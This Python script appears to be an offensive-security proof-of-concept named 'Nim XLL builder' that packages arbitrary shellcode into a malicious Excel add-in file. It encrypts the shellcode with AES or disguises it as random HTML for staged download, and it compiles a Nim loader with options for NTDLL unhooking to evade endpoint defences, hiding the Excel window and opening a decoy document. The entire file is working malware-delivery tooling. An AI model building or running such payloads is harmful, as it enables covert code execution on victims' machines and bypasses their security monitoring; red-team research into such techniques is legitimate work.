import argparse
import base64
import os
import random
import shutil
from binascii import hexlify

from Crypto.Cipher import AES
from Crypto.Util import Counter

banner = """
                        _ _       
                       | | |       
 _   _ _   _  ____ ____| | | ____ 
( \\ / ) | | |/ ___) _  ) | |/ _  |
 ) X (| |_| | |  ( (/ /| | ( ( | |
(_/ \\_)\\__  |_|   \\____)_|_|\\_||_|
      (____/       Nim XLL builder PoC v0.2.1               
"""

print(banner)
def encode_shellcode(sc_bytes):
	STATE_OPEN = "<"
	STATE_CLOSE = ">"
	STATE_CLOSETAG = "/>"
	STATE_EQUALS = " = "
	STATE_PAYLOADTAG = "x"
	STATE_PAYLOADBODY = "y"
	STATE_TAGSPACE = "STATE_TAGSPACE"
	STATE_BODYSPACE = "STATE_BODYSPACE"
	STATE_CRLF = "\n"
	
	transitions = {
		STATE_OPEN : { STATE_PAYLOADTAG: 1 },
		STATE_CLOSE : { STATE_PAYLOADBODY: 1 },
		STATE_CLOSETAG : { STATE_OPEN: 1 },
		STATE_EQUALS : { STATE_PAYLOADTAG: 1 },
		STATE_PAYLOADTAG : {STATE_PAYLOADTAG: 0.5, STATE_CLOSETAG: 0.15, STATE_CLOSE: 0.15, STATE_TAGSPACE: 0.1, STATE_EQUALS: 0.1},
		STATE_PAYLOADBODY : {STATE_PAYLOADBODY: 0.775, STATE_BODYSPACE: 0.1, STATE_CRLF: 0.025, STATE_OPEN: 0.1},
		STATE_TAGSPACE : { STATE_PAYLOADTAG: 1 },
		STATE_BODYSPACE : { STATE_PAYLOADBODY: 1 },
		STATE_CRLF : { STATE_PAYLOADBODY: 1 }
	}

	
	to_encode = base64.urlsafe_b64encode(sc_bytes)
	
	out = ""
	
	current_state = STATE_OPEN
	encoded_chars = 0
	out += "<html>\n"
	while encoded_chars < len(to_encode):
		if current_state in [STATE_BODYSPACE, STATE_TAGSPACE]:
			out += " "
		elif current_state in [STATE_PAYLOADTAG, STATE_PAYLOADBODY]:
			out += chr(to_encode[encoded_chars])
			encoded_chars += 1
		else:
			out += current_state
		current_state = random.choices(list(transitions[current_state].keys()), list(transitions[current_state].values()))[0]
	out += "\n</html>"
	return out


def bytes_to_nimarr(bytestr, varname, genconst=False):
	byteenum = ""
	for i in bytestr:
		byteenum += "{0:#04x}, ".format(i)

	if genconst:
		return "const "+varname+": array[{}, byte] = [byte {}]".format(len(bytestr), byteenum[:-2])

	return "var "+varname+": array[{}, byte] = [byte {}]".format(len(bytestr), byteenum[:-2])


parser = argparse.ArgumentParser()

staging = parser.add_argument_group('staging arguments')

staging.add_argument("-u", "--stageurl", type=str,
	help="URL to stage from (if staged, optional)")

stageless = parser.add_argument_group('stageless arguments')

stageless.add_argument("-e", "--encrypt", action="store_true",
	help="encrypt shellcode (aes128-cbc)")

compilation = parser.add_argument_group('compilation arguments')

compilation.add_argument("-n", "--skip-unhook", action="store_true",
	help="do not do NTDLL unhooking")

compilation.add_argument("-w", "--hidewindow", action="store_true",
	help="hide excel window during execution")

compilation.add_argument("-d", "--decoy", type=str,
	help="path to the decoy file to open on startup (optional)")

compilation.add_argument("-v", "--verbose", action="store_true",
	help="increase output verbosity")

compilation.add_argument("-o", "--output", type=str, default="addin.xll",
	help="path to store the resulting .XLL file (optional)")


required = parser.add_argument_group('required arguments')
required.add_argument("-s", "--shellcode", type=str,
	help="path to shellcode .bin (required)", required=True)


args = parser.parse_args()


with open("xll_template.nim", "r") as f:
	template_str = f.read()



compile_template = "nim c --app:lib --passL:\"-static-libgcc -static -lpthread\" --hints:off --define:excel {cmdline_args} --nomain --out:{outfile} --threads:on {filename}"
cmdline_args = ""
if os.name != 'nt':
	print("| cross-compilation unstable")
	cmdline_args += "--define:mingw --cpu:amd64 "


if not args.skip_unhook:
	cmdline_args += "--define:unhook "
	print("| NTDLL unhooking: on")
else:
	print("| NTDLL unhooking: off")

if args.hidewindow:
	cmdline_args += "--define:hidewindow "
	print("| hide excel window: on")
else:
	print("| hide excel window: off")

print("| release mode: off")


if args.stageurl is None:
	if args.encrypt:
		print("| generating stageless payload")
		print("| encryption: on")
		cmdline_args += "--define:encrypted "
		with open(args.shellcode, "rb") as f:
			scode_bytes = f.read()

		key = os.urandom(16)
		iv = os.urandom(16)

		ctr = Counter.new(128, initial_value=int(hexlify(iv), 16))
		cipher = AES.new(key, AES.MODE_CTR, counter=ctr)

		encdata = cipher.encrypt(scode_bytes)

		xll_nim = template_str.replace("#[ KEY_STR ]#", bytes_to_nimarr(key, "aeskey", True))
		xll_nim = xll_nim.replace("#[ IV_STR ]#", bytes_to_nimarr(iv, "aesiv", True))
		xll_nim = xll_nim.replace("#[ ENC_SC ]#", bytes_to_nimarr(encdata, "aesdata", True))


	else:
		print("| generating stageless payload")
		print("| encryption: off")
	
		with open(args.shellcode, "rb") as f:
			scode_bytes = f.read()
	
		
		bytes_template = bytes_to_nimarr(scode_bytes, "shellcode")

		xll_nim = template_str.replace('echo "%SHELLCODE_ARRAY%"', bytes_template)
else:
	print("| generating staged payload")
	cmdline_args += "--define:staged "


	if args.verbose:
		print(" \\ URL:", args.stageurl)

	with open(args.shellcode, "rb") as f:
		scode_bytes = f.read()

	with open(args.shellcode+".html", "w") as f:
		f.write(encode_shellcode(scode_bytes))
		print("| encoded shellcode saved as", args.shellcode+".html")

	xll_nim = template_str.replace('%STAGINGURL%', args.stageurl)

if args.decoy is not None:
	print("| decoy file:", args.decoy)
	xll_nim = xll_nim.replace("%DECOYFILE%", os.path.split(args.decoy)[1])
	xll_nim = xll_nim.replace("%DECOYPATH%", args.decoy)

	cmdline_args += "--define:decoy "


tempname = "temp_xll_{}.nim".format(random.randint(1,50))
with open(tempname, "w") as f:
	f.write(xll_nim)
if args.verbose:
	print(" \\ command line:", compile_template.format(cmdline_args=cmdline_args, outfile=args.output, filename=tempname))
os.system(compile_template.format(cmdline_args=cmdline_args, outfile=args.output, filename=tempname))
os.remove(tempname)
print("! should be saved to: ", args.output)
